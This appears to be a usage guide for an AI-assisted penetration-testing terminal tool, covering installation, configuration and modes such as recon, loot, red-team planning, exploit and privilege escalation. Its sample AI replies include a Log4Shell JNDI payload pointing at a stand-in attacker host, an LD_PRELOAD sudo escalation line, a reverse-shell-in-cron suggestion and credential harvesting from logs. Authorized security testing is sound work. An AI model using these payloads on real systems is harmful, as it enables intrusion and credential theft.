# PentAI TUI - Usage Guide

## Quick Start

### Installation
```bash
# Install dependencies
python3 -m pip install --user -r requirements.txt

# Make executable
chmod +x pentai.py

# Optional: Add to PATH
sudo ln -s $(pwd)/pentai.py /usr/local/bin/pentai
```

### Configuration
```bash
# Set API key (required)
export AI_API_KEY="your-openai-api-key"

# Optional: Custom API endpoint
export AI_BASE_URL="https://api.openai.com/v1"

# Optional: Custom model
export AI_MODEL="gpt-4o-mini"

# Optional: Default target
export PENTAI_TARGET_NAME="my-target"

# Optional: Default scope
export PENTAI_SCOPE="10.0.0.0/24, example.com"
```

Add these to `~/.bashrc` or `~/.zshrc` for persistence.

## Basic Usage

### Start TUI
```bash
# Default mode (cmd)
./pentai.py

# Specific mode
./pentai.py --mode recon

# With specific target
./pentai.py --target webapp-pentest

# With context file
./pentai.py --file nmap/scan.xml --mode recon

# Prefill prompt
./pentai.py --prefill "Explain this nmap output"
```

### Target Management
```bash
# Create new target config
./pentai.py --init-target webapp-audit

# Edit target config
vim ~/.config/pentai/targets/webapp-audit.json

# View session logs
./pentai.py --view-logs --target webapp-audit

# View last 20 entries
./pentai.py --view-logs --last 20
```

## Mode-Specific Examples

### CMD Mode - Command Analysis
```
You: nmap -sS -p- -T4 192.168.1.1
AI: [Explains TCP SYN scan, port range, timing, suggests improvements]

You: [paste error message]
AI: [Diagnoses issue, suggests fixes with commands]
```

### CHAT Mode - General Questions
```
You: What's the difference between authenticated and unauthenticated scans?
AI: [Detailed explanation with examples]

You: How do I bypass WAF restrictions?
AI: [Techniques and tools within ethical boundaries]
```

### RECON Mode - Enumeration Planning
```
You: [Loads recent nmap scan automatically]
AI: Phase 1: Completed initial port scan
    Phase 2: Recommend service enumeration...
    Phase 3: Deep dive into HTTP/SMB services...
```

### LOOT Mode - Credential Hunting
```
You: [Loads log files from context]
AI: Found artifacts:
    • API key in config.php: sk-abc123...
    • Credentials in debug.log: admin:password
    • JWT token in response headers
    
    Next steps: Test API access, verify credentials...
```

### REPORT Mode - Note Generation
```
You: Summarize findings
AI: ## Penetration Test Summary
    
    ### Information Gathering
    - 5 open ports discovered
    - Apache 2.4.41 (Ubuntu)
    
    ### Vulnerabilities
    - CVE-2021-1234 on port 8080
    ...
```

### RED Mode - Attack Planning
```
You: Plan attack chain for domain admin
AI: Attack Path Overview:
    1. Initial Access: Phishing -> Macro payload
       Evidence: Meterpreter session, screenshots
       Detection: EDR alerts, process monitoring
    
    2. Privilege Escalation: GPP passwords
       Commands: Get-GPPPassword.ps1
       Detection: Event ID 4662
    ...
```

### EXPLOIT Mode - Vulnerability Analysis
```
You: Help me exploit CVE-2021-44228 (Log4Shell)
AI: [Explains vulnerability, detection methods, exploitation]
    
    Payload examples:
    ${jndi:ldap://attacker.com/a}
    
    Tools: ysoserial, JNDIExploit
    Mitigations: Update Log4j, WAF rules
```

### OSINT Mode - Intel Gathering
```
You: Enumerate subdomains for example.com
AI: Recommended tools:
    amass enum -d example.com
    subfinder -d example.com -o subs.txt
    
    Additional sources:
    - crt.sh certificate transparency
    - DNSdumpster
    - Wayback Machine
```

### PRIVESC Mode - Escalation
```
You: [Paste LinPEAS output]
AI: Identified vectors:
    1. SUID binary: /usr/bin/pkexec (CVE-2021-4034)
       Exploit: pwnkit exploit available
    
    2. Sudo misconfiguration: env_keep+=LD_PRELOAD
       Exploit: sudo LD_PRELOAD=evil.so program
    
    3. Writable cron job: /etc/cron.d/backup
       Exploit: Add reverse shell command
```

## Advanced Features

### Per-Directory Target Config
```bash
# Create .pentai-target in project directory
echo "client-webapp" > .pentai-target

# PentAI will auto-load this target
cd /path/to/project && ./pentai.py
```

### Auto-Detection of Context Files
PentAI automatically searches for:
- `./nmap/*.{nmap,gnmap,xml}`
- `./logs/*.{log,txt}`
- `./output/*`

Most recently modified file is loaded.

### Environment Variable Priority
Target name resolution order:
1. `--target` CLI argument
2. `PENTAI_TARGET_NAME` environment variable
3. `.pentai-target` file in current directory
4. "default" fallback

### Session Persistence
All Q&A saved to:
```
~/.local/share/pentai/<target-name>.jsonl
```

Each entry includes:
- Timestamp
- Mode used
- User query
- AI response
- Context file path
- Context file hash (for correlation)

### Integration with Shell

#### Bash/Zsh Function
```bash
# Add to ~/.bashrc or ~/.zshrc
pai() {
    local mode="${1:-cmd}"
    local last_cmd=$(fc -ln -1)
    pentai --mode "$mode" --prefill "$last_cmd"
}

# Usage:
nmap -sC -sV target.com
pai cmd  # Opens PentAI with last command prefilled
```

#### Quick Error Analysis
```bash
# Run command and analyze errors
./vulnerable-app 2>&1 | tee error.log
pentai --mode cmd --file error.log
```

## Tips & Best Practices

### 1. Mode Selection
- **cmd**: When you have a specific command or error
- **chat**: For conceptual questions and methodology
- **recon**: After running scans, need next steps
- **loot**: When analyzing large log files for secrets
- **report**: End of day, need to document findings
- **red**: Planning complex attack chains
- **exploit**: Working with specific vulnerabilities
- **osint**: Starting engagement, gathering intel
- **privesc**: Post-exploitation on compromised system

### 2. Context Management
- Keep context files under 8KB for best results
- Use `--file` for specific analysis
- Auto-detection works for standard layouts
- Toggle history (Ctrl+H) if too much noise

### 3. Output Usage
- Copy commands directly from AI responses
- Verify commands before execution
- Use AI suggestions as starting points
- Cross-reference with official docs

### 4. Security Notes
- API keys are never logged
- Session logs are local only
- No data sent to AI except your queries
- Review commands before running
- Stay within authorized scope

### 5. Workflow Examples

**Initial Recon:**
```bash
pentai --mode recon --file nmap/initial.xml
# Get enumeration plan, run suggested commands
pentai --mode osint
# Gather additional intel on discovered services
```

**Mid-Engagement:**
```bash
pentai --mode loot --file logs/app-debug.log
# Extract credentials and secrets
pentai --mode exploit
# Get exploitation guidance for found vulns
```

**Post-Exploitation:**
```bash
pentai --mode privesc --file linpeas.txt
# Identify privesc vectors
pentai --mode red
# Plan lateral movement and persistence
```

**Reporting:**
```bash
pentai --mode report
# Generate summary from session history
pentai --view-logs --last 50 > session-notes.txt
# Export all interactions
```

## Troubleshooting

### API Key Issues
```bash
# Verify key is set
echo $AI_API_KEY

# Test API connection
curl https://api.openai.com/v1/models \
  -H "Authorization: Bearer $AI_API_KEY"
```

### Missing Dependencies
```bash
# Reinstall requirements
python3 -m pip install --user --force-reinstall -r requirements.txt
```

### Permission Errors
```bash
# Fix config directory
mkdir -p ~/.config/pentai/targets
chmod 700 ~/.config/pentai

# Fix data directory
mkdir -p ~/.local/share/pentai
chmod 700 ~/.local/share/pentai
```

### No Context Files Found
```bash
# Specify explicitly
pentai --file /path/to/scan.xml

# Or set environment variable
export PENTAI_FILE_CONTEXT="/path/to/default.log"
```

## Configuration Examples

### Multi-Target Setup
```bash
# Create configs for different engagements
pentai --init-target webapp-pentest
pentai --init-target internal-network
pentai --init-target cloud-audit

# Edit each config
vim ~/.config/pentai/targets/webapp-pentest.json
```

### Custom API Endpoint (Local LLM)
```bash
# LM Studio
export AI_BASE_URL="http://localhost:1234/v1"
export AI_API_KEY="not-needed"
export AI_MODEL="local-model"

# Ollama
export AI_BASE_URL="http://localhost:11434/v1"
```

### Team Collaboration
```bash
# Share target configs
rsync -av ~/.config/pentai/targets/ team-share/

# Each team member can import
rsync -av team-share/ ~/.config/pentai/targets/

# Session logs stay local for privacy
```
